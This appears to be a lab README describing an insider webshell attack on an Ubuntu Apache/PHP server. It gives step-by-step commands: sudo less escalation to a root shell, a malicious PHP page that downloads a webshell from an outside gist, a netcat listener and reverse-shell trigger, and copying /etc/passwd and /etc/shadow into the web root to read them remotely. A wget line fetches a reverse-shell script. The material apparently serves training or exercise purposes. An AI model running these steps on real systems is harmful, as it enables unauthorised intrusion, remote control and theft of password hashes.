Insider Webshell Attack
=======================

The Attack
------------------
>1. Login with magnifier on ubuntu-web-pr
>2. Check Sudo Permissions - sudo -l
>3. Create file - touch lesser.txt
>4. Use less - sudo less lesser.txt
>5. Less Exploit - !/bin/sh
>6. Modify getevil.php with Malicious Code
>7. Web Browser to http://ubuntu-web-pr/getevil.php
>8. Web Browser to http://ubuntu-web-pr/evil.php
>9. From evil.php on ubuntu-web-pr Get Reverse Shell - See Reverse Shell Wget
>10. On Remote Attack Console Box Open NetCat Listeners 
>	- Terminal #1 - nc -nvlp 443
>11. Web Browser Tab #1 to http://ubuntu-web-pr/reverse-shell.php?ip=consoleIP&port=443
>12. On ubuntu-web-pr - whoami
>13. On ubuntu-web-pr - sudo -i
>14. On ubuntu-web-pr - whoami
>15. On ubuntu-web-pr - cp /etc/passwd /var/www/html
>16. On ubuntu-web-pr - cp /etc/shadow /var/www/html
>17. On ubuntu-web-pr - chown apache:apache /var/www/html/shadow
>18. On ubuntu-web-pr - chown apache:apache /var/www/html/passwd
>19. Web Browser to http://ubuntu-web-pr/passwd
>20. Web Browser to http://ubuntu-web-pr/shadow
>21. On ubuntu-web-pr - rm /var/www/html/passwd
>22. On ubuntu-web-pr - rm /var/www/html/shadow


Environment
-----------
**Two Web Servers:** Ubuntu 20.04.1
>VSphere:
>	CPU: 1 
>	Memory: 4 GB
>	Disk: 20 GB
>AWS:
>  t2.micro
>Default Packages Needed: 
>	- cron
>	- rsync
>	- sudo
>	- less
>	Install Apache with PHP on Both Servers:
>	- sudo apt install php libapache2-mod-php
  
**Attacker Remote Console**
>VSphere:
>	CPU: 1 
>	Memory: 4 GB
>	Disk: 20 GB
>AWS:
>  t2.micro
  
**Attacker Remote**
>Any machine with a webbrowser
  
Code
----
**Good getevil.php**
```<html>
<head>
<title>I'm a Good Web Page</title>
</head>
<body>
I'm a Good Web Page
</body>
</html>
```  
  
** Malicious getevil.php*
```
<html> 
<head> 
<title>I'm a Bad Web Page</title> 
</head> 
<body> 
I'm a Bad Web Page 

<?php // Normal code  echo "Whatsupppp";   
// start of evil code 
$code = file_get_contents("https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/9377612eeea89aed2b226a870e76ac12965d6694/easy-simple-php-webshell.php"); 
$myfile = fopen("evil.php", "w+") or die("Unable to open file!");   
fwrite($myfile, $code);  
fclose($myfile);  
// end of evil code  ?>
</body> 
</html>  
```  

**Download Reverse Shell**
```
wget https://gist.githubusercontent.com/scottbrumley/cd76c1e61e168a5a4e8c7251fa8e8c82/raw/224af483fd976654c29f1eed9242a233437a6dad/reverse-shell.php
```  
  
